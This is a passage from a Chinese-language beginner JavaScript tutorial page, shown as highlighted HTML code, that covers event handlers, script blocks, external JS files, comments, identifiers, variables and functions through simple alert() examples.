class="comment">例如：click对应的事件句柄是onclick，mouseover对应的事件句柄是onmouseover。</span></span><br><span class="line"><span class="comment">3、所有的事件句柄都是以标签的属性形式存在。例如以下input button就有一个onclick这样属性。</span></span><br><span class="line"><span class="comment">只要有用户点击了以下的这个按钮对象，此时按钮对象上发生了鼠标单击事件，那么注册在</span></span><br><span class="line"><span class="comment">onclick事件句柄当中的JS代码会被执行！onclick后面代码实际上是浏览器负责执行的。</span></span><br><span class="line"><span class="comment">4、onclick=&quot;后面的代码&quot;并不是在浏览器打开的时候执行，浏览器打开的时候，只是将这个代码</span></span><br><span class="line"><span class="comment">注册给onclick事件句柄了。等待该按钮的click事件发生，只要发生，后面代码会被事件监听器</span></span><br><span class="line"><span class="comment">调用。</span></span><br><span class="line"><span class="comment">5、怎么使用JS代码弹窗？</span></span><br><span class="line"><span class="comment">在JS当中有一个内置的BOM对象，可以直接拿来使用，全部小写：window</span></span><br><span class="line"><span class="comment">其中window对象有一个方法/函数叫做alert，这个函数专门用来弹出对话框！</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">6、window.alert(&#x27;hello world!&#x27;); 弹窗的JS代码。</span></span><br><span class="line"><span class="comment">通过这个代码可以知道：JS中的字符串可以使用单引号括起来，也可以使用双引号。</span></span><br><span class="line"><span class="comment">JS中的一条语句可以“;”结尾，也可以不以“;”结尾。</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hello1&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;window.alert(&#x27;hello world!&#x27;);&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hello2&quot;</span> <span class="attr">onclick</span>=<span class="string">&#x27;window.alert(&quot;hello world!&quot;)</span></span></span><br><span class="line"><span class="string"><span class="tag"> window.alert(&quot;hello kitty&quot;)</span></span></span><br><span class="line"><span class="string"><span class="tag"> window.alert(&quot;你好,中国!&quot;)&#x27;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- window. 可以省略 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hello3&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(&#x27;hello world!&#x27;);&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="出了点问题：在用sublime-text编辑时，好像格式有要求，他会有引号不匹配，但换成HBuilder又行了，不懂怎么回事。"><a href="#出了点问题：在用sublime-text编辑时，好像格式有要求，他会有引号不匹配，但换成HBuilder又行了，不懂怎么回事。" class="headerlink" title="出了点问题：在用sublime text编辑时，好像格式有要求，他会有引号不匹配，但换成HBuilder又行了，不懂怎么回事。"></a>出了点问题：在用sublime text编辑时，好像格式有要求，他会有引号不匹配，但换成HBuilder又行了，不懂怎么回事。</h3><h2 id="3-2-脚本块方式"><a href="#3-2-脚本块方式" class="headerlink" title="3.2 脚本块方式"></a>3.2 脚本块方式</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 脚本块的位置随意，没有限制！ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;page begin&quot;</span>)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>在HTML中嵌入JS代码的第二种方式：脚本块的方式<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 这个按钮会先被加载到浏览器内存。 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;按钮1&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 脚本块 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 一个页面中脚本块可以出现多个！ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">/* 在这里直接编写JS代码，这些JS代码在页面打开的时候自上而下的顺序依次逐行执行！ */</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">//alert(&quot;hello world&quot;); // 单行注释</span></span></span><br><span class="line"><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;hello zhangsan&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;hello lisi&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">/*</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">多行注释</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">*/</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 最后加载这个按钮2 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;按钮2&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;page end!&quot;</span>)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="3-3-引入外部独立的JS文件"><a href="#3-3-引入外部独立的JS文件" class="headerlink" title="3.3 引入外部独立的JS文件"></a>3.3 引入外部独立的JS文件</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>在HTML中嵌入JS的第三种方式：引入外部独立的JS文件<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 引入外部独立的CSS文件。这个标签link中属性是href --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">href</span>=<span class="string">&quot;&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 引入外部独立的js文件 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- script标签引入js文件的时候，是src属性，不是href。 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/1.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 引入第二次，这个操作没有意义，测试结果：只要引入一次JS文件，JS文件中的代码就会全部执行一遍 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/1.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/1.js&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">//alert(&quot;hello world!~~~~~&quot;); // 这里的代码不会执行！</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 单独的脚本块 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;hello world!%%%%%%%%&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="文件代码"><a href="#文件代码" class="headerlink" title="文件代码"></a>文件代码</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 这是一堆JS代码，这些JS代码在HTML引入的时候，遵循自上而下的顺序依次逐行执行的！ */</span></span><br><span class="line"><span class="title function_">alert</span>(<span class="string">&quot;hello world&quot;</span>)</span><br><span class="line"><span class="title function_">alert</span>(<span class="string">&quot;hello kitty&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="关于各种注释"><a href="#关于各种注释" class="headerlink" title="关于各种注释"></a>关于各种注释</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>关于各种注释<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="comment">/* CSS的注释 */</span></span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 这是HTML的注释 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">/* 这是javascript注释，多行 */</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 这是javascript注释,单行</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="标识符和关键字"><a href="#标识符和关键字" class="headerlink" title="标识符和关键字"></a>标识符和关键字</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>标识符和关键字<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">/* 标识符命名规则和命名规范按照java那一套来就行！ */</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">/*</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">以下这段代码是JS的for循环，找出其中的关键字和标识符？</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">关键字：var、for</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">标识符：i、alert</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript"></span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">标识符命名规则：</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">标识符只能由数字、字母、下划线、美元符号组成，不能含有其它特殊符号</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">标识符不能以数字开始</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">标识符严格区分大小写</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">关键字不能做标识符</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">标识符理论上没有长度限制</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript"></span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">标识符命名规范？</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">.....</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">*/</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;i = &quot;</span> + i)</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>JS的变量<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">/*</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">回顾Java中的变量？</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">怎么声明？</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">int i;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">double d;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">String s;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">怎么赋值？</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">i = 100;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">d = 3.14;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">s = &quot;abc&quot;;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">一行上能声明多个变量吗？</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">int a, b, c = 300;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">a b c都是int类型。</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">a和b没有赋值。</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">c赋值300</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript"></span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">重点：Java语言是一种强类型语言，有编译阶段，属于编译型语言。</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">Java语言在编译阶段确定变量的数据类型，也就是说程序还没有</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">运行呢，变量的数据类型就已经确定了，并且该变量的数据类型</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">在这一生中，永远不可变。</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">int x = 1200;【x = true; java的编译器会报错。不让这样做。语法不对！】</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">double d = x; </span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">这行代码表示x的变量中保存的值1200给d变量</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">x变量还是int类型，d变量是double类型。一生不变。</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript"></span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">JS的变量？</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">怎么声明？</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">var 变量名;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">var i;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">怎么赋值？</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">变量名 = 值;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">i = 100;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">一行上能声明多个变量吗？</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">var a, b, c = 300;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">声明3个变量，a b c，并且c赋值300，其中a和b变量没有赋值，系统默认赋值undefined</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">undefined 在JS中一个具体的值，这个值就是 undefined</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript"></span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">重点：JS语言是一种弱类型语言，没有编译阶段，直接浏览器打开解释执行，</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">在JS中声明变量时不需要指定变量的数据类型，程序在运行过程当中，赋什么</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">类型的值，变量就是什么数据类型，并且变量的数据类型是可变的。</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">var i;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">i = 100; 到这里i是整数型</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">i = false; 到这里i就是布尔类型了</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">i = true;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">i = 3.14;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">i = new Object();</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">*/</span></span></span><br><span class="line"><span class="language-javascript">   <span class="keyword">var</span> i;</span></span><br><span class="line"><span class="language-javascript">   <span class="title function_">alert</span>(i) <span class="comment">// 变量只声明没有赋值,系统默认赋值undefined, 在JS当中undefined是一个具体存在的值.</span></span></span><br><span class="line"><span class="language-javascript">   </span></span><br><span class="line"><span class="language-javascript">   <span class="keyword">var</span> x = <span class="string">&quot;undefined&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">   <span class="title function_">alert</span>(x) <span class="comment">// &quot;undefined&quot;这个不是undefined,它是一个字符串.</span></span></span><br><span class="line"><span class="language-javascript">   </span></span><br><span class="line"><span class="language-javascript">   <span class="comment">// 声明时,同时赋值</span></span></span><br><span class="line"><span class="language-javascript">   <span class="keyword">var</span> k = <span class="number">100</span>;</span></span><br><span class="line"><span class="language-javascript">   <span class="title function_">alert</span>(k + <span class="number">1</span>) <span class="comment">// 101</span></span></span><br><span class="line"><span class="language-javascript">   </span></span><br><span class="line"><span class="language-javascript">   k = <span class="literal">false</span>;</span></span><br><span class="line"><span class="language-javascript">   <span class="title function_">alert</span>(k);</span></span><br><span class="line"><span class="language-javascript">   </span></span><br><span class="line"><span class="language-javascript">   k = <span class="string">&quot;abc&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">   <span class="title function_">alert</span>(k)</span></span><br><span class="line"><span class="language-javascript">   </span></span><br><span class="line"><span class="language-javascript">   <span class="comment">// 一行上可以声明多个变量</span></span></span><br><span class="line"><span class="language-javascript">   <span class="comment">//var是一个关键字,就是用来声明变量的,variables单词的前3个字母.</span></span></span><br><span class="line"><span class="language-javascript">   <span class="keyword">var</span> a, b, c = <span class="number">100</span>;</span></span><br><span class="line"><span class="language-javascript">   <span class="title function_">alert</span>(a) <span class="comment">// undefined</span></span></span><br><span class="line"><span class="language-javascript">   <span class="title function_">alert</span>(b) <span class="comment">// undefined</span></span></span><br><span class="line"><span class="language-javascript">   <span class="title function_">alert</span>(c) <span class="comment">// 100</span></span></span><br><span class="line"><span class="language-javascript">   </span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>函数初步<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">//alert(122222);</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">/*</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">回顾Java中的方法：</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">[修饰符列表] 返回值类型 方法名(形式参数列表)&#123;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">方法体;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">&#125;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">例如：</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">public static int sum(int a,int b)&#123;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">return a + b;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">&#125;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript"></span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">JavaScript当中的函数：</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">函数定义的语法格式是什么？</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">function 函数名(形式参数列表)&#123;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">函数体;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">&#125;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">例如：</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">function sum(a, b)&#123;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">return a + b;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">&#125;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript"></span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">函数名：sum</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">形式参数列表是：a和b  (a和b都是变量名！)</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript"></span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">JS中的函数返回值类型是不需要指定的，因为可以返回任何类型的数据。没有限制。</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript"></span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">关于JS的的调试？</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">首选方案是：alert()，在程序的某个位置先使用alert弹出某个变量的值，看看是否是你需要的。</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">通过alert可以调试JS代码。</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript"></span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">另外一种方案是：采用浏览器自带的调试插件，F12</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">F12这个插件中比较重要的面板：</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">控制台</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">查看器</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">网络</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">掌握以上三个面板！！！！！！！！！！！！</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">*/</span></span></span><br><span class="line"><span class="language-javascript">   <span class="comment">/* function sum(a, b)&#123;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">   </span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">   &#125; */</span></span></span><br><span class="line"><span class="language-javascript">   </span></span><br><span class="line"><span class="language-javascript">   <span class="comment">// 函数必须调用才会执行.</span></span></span><br><span class="line"><span class="language-javascript">   <span class="keyword">function</span> <span class="title function_">sum</span>(<span class="params">x, y</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">   <span class="title function_">alert</span>(x + <span class="string">&quot;,&quot;</span> + y);</span></span><br><span class="line"><span class="language-javascript">   <span class="comment">//alert(&quot;sum函数执行了！&quot;);</span></span></span><br><span class="line"><span class="language-javascript">   &#125;</span></span><br><span class="line"><span class="language-javascript">   </span></span><br><span class="line"><span class="language-javascript">   <span class="comment">//这一切都是因为js是一门弱类型语言!</span></span></span><br><span class="line"><span class="language-javascript">   <span class="title function_">sum</span>(<span class="string">&quot;abc&quot;</span>, <span class="literal">false</span>);</span></span><br><span class="line"><span class="language-javascript">   </span></span><br><span class="line"><span class="language-javascript">   <span class="comment">// 调用sum函数</span></span></span><br><span class="line"><span class="language-javascript">   <span class="title function_">sum</span>();</span></span><br><span class="line"><span class="language-javascript">   </span></span><br><span class="line"><span class="language-javascript">   <span class="comment">// 调用sum函数</span></span></span><br><span class="line"><span class="language-javascript">   <span class="title function_">sum</span>(<span class="number">1</span>);</span></span><br><span class="line"><span class="language-javascript">   </span></span><br><span class="line"><span class="language-javascript">   <span class="comment">// 调用sum函数</span></span></span><br><span class="line"><span class="language-javascript">   <span class="title function_">sum</span>(<span class="number">1</span>,<span class="number">2</span>);</span></span><br><span class="line"><span class="language-javascript">   </span></span><br><span class="line"><span class="language-javascript">   <span class="comment">// 调用sum函数</span></span></span><br><span class="line"><span class="language-javascript">   <span class="title function_">sum</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>);</span></span><br><span class="line"><span class="language-javascript">   </span></span><br><span class="line"><span class="language-javascript">   <span class="comment">/* JS的函数还有另一种声明方式？*/</span></span></span><br><span class="line"><span class="language-javascript">   <span class="comment">/* function mysum(a, b)&#123;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">   </span></span></span><br><span 